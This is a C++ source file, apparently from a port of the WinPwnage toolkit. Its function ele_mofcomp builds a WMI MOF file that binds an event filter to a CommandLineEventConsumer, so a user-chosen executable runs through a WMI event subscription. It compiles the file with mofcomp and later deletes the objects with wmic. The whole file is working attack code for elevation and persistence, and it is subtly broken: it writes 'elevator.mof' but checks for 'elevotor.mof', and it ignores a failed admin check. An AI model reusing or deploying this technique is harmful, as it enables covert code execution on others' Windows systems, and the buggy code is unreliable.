#include "common.h"
#include "elevationTech.h"

BOOL ele_mofcomp()
{
	string payload;
	string mof_template;
	cout << "Enter the path for Payload: \n";
	cin >> payload;
	HANDLE hFile;
	DWORD size1, size2, nByte1 = 0, nByte;
	string tempPath = "%TEMP%";
	BOOL dTemp;
	string path,path1, pathMof, cmds1, cmds2, cmds3;

	if (!IsUserAnAdmin())
	{
		printf("cannot proceed, we aren't elevated \n");
	}

	if (endsWith(payload, ".exe"))
	{
		string abc = "#PRAGMA NAMESPACE(";
		mof_template = "#PRAGMA AUTORECOVER\n" +
			abc + R"(")"  + "\\\\\\\\\.\\\\root\\\\subscription" + R"(")" + ")\n" + "\n" + "\n" +
			"instance of __EventFilter as $Filt\n" +
			"{\n" + "\n" + "\n" + "       "+
			"Name =" + "\"WinPwnageEventFilter\";\n" + "       "+
			"Query =" + "\"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA" + R"(\)" + "'Win32_PerfFormattedData_PerfOS_System" + R"(\)" + "'" + ";\n" + "       "+
			"QueryLanguage = " + "\"WQL\";\n" + "       "+
			"EventNamespace = " + "\"root\\\\cimv2\";\n" +
			"};\n" + "\n" +
			"instance of CommandLineEventConsumer as $Cons\n" +
			"{\n" + "\n" + "       " +
			"	Name = " + "\"WinPwnageConsumer\";" + "\n" + "	" +
			"RunInteractively=false;\n" + "        " +
			"CommandLineTemplate=" + R"(")" + payload + R"(")" + ";\n" +
			"};\n" + "\n" + "\n" +
			"instance of __FilterToConsumerBinding\n" +
			"{\n" + "\n" + "\n" +
			"	Filter = $Filt;\n" +
			"	Consumer = $Cons;\n" + "\n" +
			"};\n";

		size1 = ExpandEnvironmentStrings((LPCSTR)tempPath.c_str(), NULL, NULL);
		if (size1 == 0)
		{
			printf("Function failed to expand variable: %x \n", GetLastError());
		}

		char* resultString1 = new char[(DWORD)size1];
		size2 = ExpandEnvironmentStrings((LPCSTR)tempPath.c_str(), resultString1, (DWORD)(size1));
		if (size2 == 0)
		{
			printf("Function failed to expand variable: %x \n", GetLastError());
		}

		dTemp = GetTempPathA(1024, resultString1);
		path = string(resultString1) + "elevator.mof";

		hFile = CreateFileA((LPCSTR)path.c_str(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf("function failed to create file1: %x \n", GetLastError());
		}


		BOOL bWrite = WriteFile(hFile, mof_template.c_str(), strlen(mof_template.c_str()), &nByte, NULL);
		if (bWrite == 0)
		{
			printf("function failed to write  file: %x \n", GetLastError());
		}
		CloseHandle(hFile);

		Sleep(1000 * 5);

		DWORD dWord = GetTempPathA(1024, resultString1);
		path1 = string(resultString1) + "elevotor.mof";
		
		if (PathFileExists((LPCSTR)path1.c_str()) == TRUE)
		{
			BOOL check = process_create(L"mofcomp.exe",(LPCWSTR)path1.c_str());
			if (check == TRUE)
			{
				printf("Successfully complied mof file using mofcomp\n");
			}
			else
			{
				printf("Unable to compile mof file containing our payload\n");
			}
		}
		Sleep(1000 * 10);

		string rot = "\\\\\\\\\.\\\\root\\\\subscription";
		string b1 = "/namespace:" + rot + " PATH __EventFilter WHERE Name=" + "WinPwnageEventFilter" + "DELETE";
		string b2 = "/namespace:" + rot + " PATH CommandLineEventConsumer WHERE Name=" + "WinPwnageConsumer" + "DELETE";
		string b3 = "/namespace:" + rot + " PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name=" + "WinPwnageEventFilter" + "\' DELETE";
		std::map<std::string, std::string> m;
		m["__EventFilter"] = b1;
		m["CommandLineEventConsumer"] = b2;
		m["__FilterToConsumerBinding"] = b3;

		BOOL check1 = process_create(L"wmic.exe", (LPCWSTR)m["__EventFilter"].c_str());
		
		BOOL check2 = process_create(L"wmic.exe", (LPCWSTR)m["CommandLineEventConsumer"].c_str());
		
		BOOL check3 = process_create(L"wmic.exe", (LPCWSTR)m["__FilterToConsumerBinding"].c_str());
		
		return TRUE;
	}
	return FALSE;
}